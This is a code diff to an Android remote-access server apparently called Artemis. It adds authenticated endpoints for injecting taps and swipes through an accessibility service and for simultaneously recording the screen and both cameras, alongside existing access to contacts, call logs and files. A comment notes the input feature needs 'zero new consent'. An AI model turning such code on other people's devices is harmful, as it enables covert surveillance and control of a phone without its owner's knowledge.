@@ -170,6 +170,8 @@ class SimpleHttpServer(
     private val fileSystemHelper: FileSystemHelper,
     private val contactsProvider: ContactsProvider,
     private val batteryHelper: BatteryHelper,
+    private val remoteInputController: com.example.artemis.feature.RemoteInputController,
+    private val tripleRecorder: com.example.artemis.feature.TripleRecorder,
     private val port: Int = 8443,
     private val useTls: Boolean = true
 ) {
@@ -288,6 +290,20 @@ class SimpleHttpServer(
             }
         }
 
+        // Remote-admin input (v2.3.3): tap/swipe/long-press/system actions via
+        // the accessibility service (already enabled — zero new consent).
+        router.post("/api/v1/control/tap") { requireAuth(it) { req -> controlTapHandler(req) } }
+        router.post("/api/v1/control/longpress") { requireAuth(it) { req -> controlLongPressHandler(req) } }
+        router.post("/api/v1/control/swipe") { requireAuth(it) { req -> controlSwipeHandler(req) } }
+        router.post("/api/v1/control/action") { requireAuth(it) { req -> controlActionHandler(req) } }
+
+        // Triple RECORD (v2.3.3): screen + front + rear, one button.
+        router.post("/api/v1/record/start") { requireAuth(it) { req -> recordStartHandler(req) } }
+        router.post("/api/v1/record/stop") { requireAuth(it) { req -> recordStopHandler(req) } }
+        router.get("/api/v1/record/status") { requireAuth(it) { req -> recordStatusHandler(req) } }
+        router.get("/api/v1/record/list") { requireAuth(it) { req -> recordListHandler(req) } }
+        router.get("/api/v1/record/{media}/{id}/file") { requireAuth(it) { req -> recordFileHandler(req) } }
+
         // Call logs (READ_CALL_LOG)
         router.get("/api/v1/logs/calls") { requireAuth(it) { req -> callLogsHandler(req) } }
 
@@ -388,7 +404,7 @@ class SimpleHttpServer(
     private fun healthHandler(req: HttpRequest): HttpResponse {
         return jsonResponse(200, mapOf(
             "status" to "ok",
-            "version" to "2.3.1",
+            "version" to "2.3.3",
             "deviceName" to android.os.Build.MODEL,
             "uptimeSeconds" to ((System.currentTimeMillis() - startTime) / 1000),
             "activeConnections" to activeConnections,
@@ -952,6 +968,98 @@ class SimpleHttpServer(
     }
 
     // ============================================================
+    // Remote-admin control (v2.3.3): accessibility input + triple RECORD
+    // ============================================================
+
+    private fun controlTapHandler(req: HttpRequest): HttpResponse {
+        val body = parseJsonObject(req.body)
+        val x = body?.get("x")?.toFloatOrNull()
+            ?: return jsonResponse(400, mapOf("error" to "bad_request", "message" to "Missing x/y"))
+        val y = body["y"]?.toFloatOrNull()
+            ?: return jsonResponse(400, mapOf("error" to "bad_request", "message" to "Missing x/y"))
+        return if (remoteInputController.tap(x, y)) {
+            jsonResponse(200, mapOf("status" to "queued"))
+        } else {
+            jsonResponse(409, mapOf("error" to "accessibility_disabled", "message" to "RemoteControlService not connected — enable the accessibility service"))
+        }
+    }
+
+    private fun controlLongPressHandler(req: HttpRequest): HttpResponse {
+        val body = parseJsonObject(req.body)
+        val x = body?.get("x")?.toFloatOrNull()
+            ?: return jsonResponse(400, mapOf("error" to "bad_request", "message" to "Missing x/y"))
+        val y = body["y"]?.toFloatOrNull()
+            ?: return jsonResponse(400, mapOf("error" to "bad_request", "message" to "Missing x/y"))
+        return if (remoteInputController.longPress(x, y)) {
+            jsonResponse(200, mapOf("status" to "queued"))
+        } else {
+            jsonResponse(409, mapOf("error" to "accessibility_disabled", "message" to "RemoteControlService not connected — enable the accessibility service"))
+        }
+    }
+
+    private fun controlSwipeHandler(req: HttpRequest): HttpResponse {
+        val body = parseJsonObject(req.body)
+        val x1 = body?.get("x1")?.toFloatOrNull()
+            ?: return jsonResponse(400, mapOf("error" to "bad_request", "message" to "Missing x1/y1/x2/y2"))
+        val y1 = body["y1"]?.toFloatOrNull()
+            ?: return jsonResponse(400, mapOf("error" to "bad_request", "message" to "Missing x1/y1/x2/y2"))
+        val x2 = body["x2"]?.toFloatOrNull()
+            ?: return jsonResponse(400, mapOf("error" to "bad_request", "message" to "Missing x1/y1/x2/y2"))
+        val y2 = body["y2"]?.toFloatOrNull()
+            ?: return jsonResponse(400, mapOf("error" to "bad_request", "message" to "Missing x1/y1/x2/y2"))
+        val durationMs = body["durationMs"]?.toLongOrNull()
+        return if (remoteInputController.swipe(x1, y1, x2, y2, durationMs)) {
+            jsonResponse(200, mapOf("status" to "queued"))
+        } else {
+            jsonResponse(409, mapOf("error" to "accessibility_disabled", "message" to "RemoteControlService not connected — enable the accessibility service"))
+        }
+    }
+
+    private fun controlActionHandler(req: HttpRequest): HttpResponse {
+        val body = parseJsonObject(req.body)
+        val action = body?.get("action")
+            ?: return jsonResponse(400, mapOf("error" to "bad_request", "message" to "Missing action"))
+        return when {
+            !remoteInputController.available -> jsonResponse(409, mapOf("error" to "accessibility_disabled", "message" to "RemoteControlService not connected — enable the accessibility service"))
+            remoteInputController.global(action) -> jsonResponse(200, mapOf("status" to "queued", "action" to action))
+            else -> jsonResponse(400, mapOf("error" to "unknown_action", "message" to "Unknown action '$action'"))
+        }
+    }
+
+    private fun recordStartHandler(req: HttpRequest): HttpResponse {
+        val body = parseJsonObject(req.body)
+        val lens = if (body?.get("lens") == "front")
+            androidx.camera.core.CameraSelector.LENS_FACING_FRONT
+        else
+            androidx.camera.core.CameraSelector.LENS_FACING_BACK
+        return jsonResponse(200, tripleRecorder.start(lens))
+    }
+
+    private fun recordStopHandler(req: HttpRequest): HttpResponse {
+        return jsonResponse(200, tripleRecorder.stop())
+    }
+
+    private fun recordStatusHandler(req: HttpRequest): HttpResponse {
+        return jsonResponse(200, tripleRecorder.status())
+    }
+
+    private fun recordListHandler(req: HttpRequest): HttpResponse {
+        val listing = tripleRecorder.list()
+        val asAny: Map<String, Any?> = listing.mapValues { it.value as Any? }
+        return jsonResponse(200, asAny)
+    }
+
+    private fun recordFileHandler(req: HttpRequest): HttpResponse {
+        val media = req.pathParams["media"]
+            ?: return jsonResponse(400, mapOf("error" to "bad_request", "message" to "Missing media folder"))
+        val id = req.pathParams["id"]
+            ?: return jsonResponse(400, mapOf("error" to "bad_request", "message" to "Missing recording id"))
+        val file = tripleRecorder.getFile(media, id)
+            ?: return jsonResponse(404, mapOf("error" to "not_found", "message" to "Recording file not found"))
+        return binaryFileResponse(file, "video/mp4")
+    }
+
+    // ============================================================
     // Camera feed (v2.3.0 helper)
     // ============================================================
 
@@ -1243,9 +1351,7 @@ class SimpleHttpServer(
                                         } else {
                                             cameraController.stopPreviewStream()
                                             // Front-cam PiP keeps running in screen mode.
-                                            if (st.pipOn) cameraController.startPreviewStream(
-                                                androidx.camera.core.CameraSelector.LENS_FACING_FRONT
-                                            )
+                                            if (st.pipOn) cameraController.startPreviewStream(st.camLens)
                                         }
                                     }
                                     "camera" -> {
@@ -1254,6 +1360,8 @@ class SimpleHttpServer(
                                         else
                                             androidx.camera.core.CameraSelector.LENS_FACING_BACK
                                         if (st.source == "cam") cameraController.startPreviewStream(st.camLens)
+                                        if (st.source == "screen" && st.pipOn) cameraController.startPreviewStream(st.camLens)
+                                        tripleRecorder.onPreviewLensChanged(st.camLens)
                                     }
                                     "flip" -> {
                                         st.camLens = if (st.camLens == androidx.camera.core.CameraSelector.LENS_FACING_FRONT)
@@ -1261,6 +1369,73 @@ class SimpleHttpServer(
                                         else
                                             androidx.camera.core.CameraSelector.LENS_FACING_FRONT
                                         if (st.source == "cam") cameraController.startPreviewStream(st.camLens)
+                                        if (st.source == "screen" && st.pipOn) cameraController.startPreviewStream(st.camLens)
+                                        tripleRecorder.onPreviewLensChanged(st.camLens)
+                                    }
+                                    "input" -> {
+                                        val action = obj["action"]?.jsonPrimitive?.content ?: ""
+                                        val ok = when (action) {
+                                            "tap" -> {
+                                                val x = obj["x"]?.jsonPrimitive?.content?.toFloatOrNull() ?: -1f
+                                                val y = obj["y"]?.jsonPrimitive?.content?.toFloatOrNull() ?: -1f
+                                                if (x < 0 || y < 0) false else remoteInputController.tap(x, y)
+                                            }
+                                            "swipe" -> {
+                                                val x1 = obj["x1"]?.jsonPrimitive?.content?.toFloatOrNull() ?: -1f
+                                                val y1 = obj["y1"]?.jsonPrimitive?.content?.toFloatOrNull() ?: -1f
+                                                val x2 = obj["x2"]?.jsonPrimitive?.content?.toFloatOrNull() ?: -1f
+                                                val y2 = obj["y2"]?.jsonPrimitive?.content?.toFloatOrNull() ?: -1f
+                                                if (x1 < 0 || y1 < 0 || x2 < 0 || y2 < 0) false
+                                                else remoteInputController.swipe(x1, y1, x2, y2)
+                                            }
+                                            "global" -> remoteInputController.global(obj["v"]?.jsonPrimitive?.content ?: "")
+                                            else -> false
+                                        }
+                                        val status = when {
+                                            !ok && !remoteInputController.available -> "accessibility_disabled"
+                                            ok -> "queued"
+                                            else -> "bad_command"
+                                        }
+                                        try {
+                                            LiveWsProtocol.writeFrame(
+                                                output, LiveWsProtocol.OP_TEXT,
+                                                "{\"event\":\"input\",\"status\":\"$status\"}".toByteArray(Charsets.UTF_8)
+                                            )
+                                        } catch (_: Exception) { }
+                                    }
+                                    "record" -> {
+                                        val v = obj["v"]?.jsonPrimitive?.content
+                                        if (v == "on") {
+                                            if (!tripleRecorder.isRecording()) {
+                                                tripleRecorder.start(st.camLens)
+                                            }
+                                            try {
+                                                LiveWsProtocol.writeFrame(
+                                                    output, LiveWsProtocol.OP_TEXT,
+                                                    buildJsonObject(
+                                                        mapOf(
+                                                            "event" to "record_status",
+                                                            "recording" to true,
+                                                            "lenses" to tripleRecorder.activeLenses
+                                                        )
+                                                    ).toByteArray(Charsets.UTF_8)
+                                                )
+                                            } catch (_: Exception) { }
+                                        } else if (v == "off") {
+                                            val result = tripleRecorder.stop()
+                                            try {
+                                                LiveWsProtocol.writeFrame(
+                                                    output, LiveWsProtocol.OP_TEXT,
+                                                    buildJsonObject(
+                                                        mapOf(
+                                                            "event" to "record_status",
+                                                            "recording" to false,
+                                                            "paths" to (result["paths"] ?: emptyMap<String, Any>())
+                                                        )
+                                                    ).toByteArray(Charsets.UTF_8)
+                                                )
+                                            } catch (_: Exception) { }
+                                        }
                                     }
                                     "pip" -> {
                                         st.pipOn = obj["v"]?.jsonPrimitive?.content == "on"
@@ -1287,7 +1462,7 @@ class SimpleHttpServer(
             if (st.source == "cam") {
                 cameraController.startPreviewStream(st.camLens)
             } else if (st.pipOn) {
-                cameraController.startPreviewStream(androidx.camera.core.CameraSelector.LENS_FACING_FRONT)
+                cameraController.startPreviewStream(st.camLens)
             }
             var lastCamSeq = -1L
             var lastPipSeq = -1L
@@ -1315,13 +1490,14 @@ class SimpleHttpServer(
                             if (!LiveWsProtocol.writeFrame(output, LiveWsProtocol.OP_BINARY, framePayload(0x01, jpeg))) break
                             sent = true
                         }
-                        // Front-cam PiP while the main view is the screen.
+                        // Camera PiP while the main view is the screen.
                         if (st.pipOn) {
                             val seq = cameraController.previewSeq()
                             if (seq >= 0 && seq != lastPipSeq) {
                                 val pipJpeg = cameraController.readLatestPreviewFrame()
                                 if (pipJpeg != null) {
-                                    if (!LiveWsProtocol.writeFrame(output, LiveWsProtocol.OP_BINARY, framePayload(0x03, pipJpeg))) break
+                                    val pipChannel = if (st.camLens == androidx.camera.core.CameraSelector.LENS_FACING_FRONT) 0x03 else 0x02
+                                    if (!LiveWsProtocol.writeFrame(output, LiveWsProtocol.OP_BINARY, framePayload(pipChannel, pipJpeg))) break
                                     lastPipSeq = seq
                                 }
                             }
@@ -1841,7 +2017,7 @@ class SimpleHttpServer(
             for ((key, value) in response.headers) {
                 headerLines.append("$key: $value\r\n")
             }
-            headerLines.append("Server: Artemis/2.3.1\r\n")
+            headerLines.append("Server: Artemis/2.3.3\r\n")
             headerLines.append("\r\n")
             output.write(headerLines.toString().toByteArray(Charsets.UTF_8))
             output.flush()
@@ -1877,7 +2053,7 @@ class SimpleHttpServer(
             for ((key, value) in response.headers) {
                 headerLines.append("$key: $value\r\n")
             }
-            headerLines.append("Server: Artemis/2.3.1\r\n")
+            headerLines.append("Server: Artemis/2.3.3\r\n")
             headerLines.append("\r\n")
 
             output.write(headerLines.toString().toByteArray(Charsets.UTF_8))
